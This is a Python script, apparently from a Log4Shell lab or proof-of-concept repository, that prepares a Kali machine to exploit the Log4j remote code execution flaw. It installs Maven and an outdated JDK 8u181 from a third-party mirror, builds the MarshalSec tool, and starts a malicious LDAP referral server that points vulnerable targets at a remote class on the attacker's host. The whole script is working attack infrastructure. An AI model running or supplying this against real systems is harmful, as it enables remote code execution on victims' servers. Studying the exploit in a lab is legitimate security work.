#!/usr/bin/env python3

# Run program using the following syntax: python3 log4j.py <ip_address of kali machine>.  
# IP address above should be the one you get when running command: ip a s eth0

# Install JDK and all software required.

import subprocess
from os import path
import os
import sys
from ipaddress import IPv4Address


#1. Please specify ip address of this Kali machine as an argv.
try:
    # If IPv4Network(3rd paramater is not a valid ip range, then will kick you to the except block.)
    print(f"{IPv4Address(sys.argv[1])}")
    # If it is valid it will assign the ip_range from the 3rd parameter.
    ip_addr = sys.argv[1]
    print("Valid ip address entered through command-line.")
except:
    print("Run program with command-line argument for ip address. Please re-run the program. Example would be python3 log4j.py 192.168.1.132")
    exit()

#2. Update Kali
print("**Updating Kali!**\n")
subprocess.run(["sudo", "apt", "update"])

#3. Install Maven
# Check if Maven is installed
try:
    mvn_check = subprocess.run(["mvn", "--version"], capture_output=True)
    print("\n**Apache Maven already installed! Continuing!\n**")
except:
    print("\n**Installing Maven!**\n")
    subprocess.run(["sudo", "apt", "install", "maven"])

#4. Download JDK-8u181
# Check if the correct JDK is installed
print("\nChecking JDK Version\n")
try:
    jdk_check = subprocess.run(["javac", "-version"], capture_output=True)
    # Check if JDK is installed. The output shows up in the stderr instead of the stdout for some reason.
    print("\n**JDK already installed! Continuing!\n**")
except:
    # Download the correct version of the JDK.
    print("\n**Downloading JDK**\n")
    subprocess.run(["wget", "https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz"])
    # Different repository usually a bit slow.
    #subprocess.run(["wget", "http://mirrors.rootpei.com/jdk/jdk-8u181-linux-x64.tar.gz"])

#5. Install JDK
    #   Check if directory /opt/jdk exists. 
    if path.exists("/opt/jdk"):
        print("/opt/jdk already exists. Will now continue to extract.")
    else:
        subprocess.run(["sudo", "mkdir", "/opt/jdk"])
        subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/jdk1.8.0_181/bin/java", "100"])
        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/jdk1.8.0_181/bin/javac", "100"])
        subprocess.run(["sudo", "update-alternatives", "--display", "java"])
        subprocess.run(["sudo", "update-alternatives", "--display", "javac"])
        subprocess.run(["sudo", "update-alternatives", "--set", "/opt/jdk/jdk1.8.0_181/bin/java"])
        subprocess.run(["java", "-version"])

#6. Get MarshalSec repo
subprocess.run(["git", "clone", "https://github.com/mbechler/marshalsec.git"])

#7. Change directory
cwd = os.getcwd()
os.chdir("./marshalsec/")
print(os.listdir())
subprocess.run(["mvn", "clean", "package", "-DskipTests"])

#8. Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
try:
    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
except:
    print("Something went wrong. Please check that you have the correct ip address")
    
# We want to thank the following people for their contribution: 
# John Hammond : https://youtu.be/7qoPDq41xhQ
# Moritz Bechler (For creating the Java Unmarshaller Security - MarshalSec) : https://github.com/mbechler/marshalsec
# xiajun325 for clear instruction on how to use the MarshalSec tool : https://github.com/xiajun325/apache-log4j-rce-poc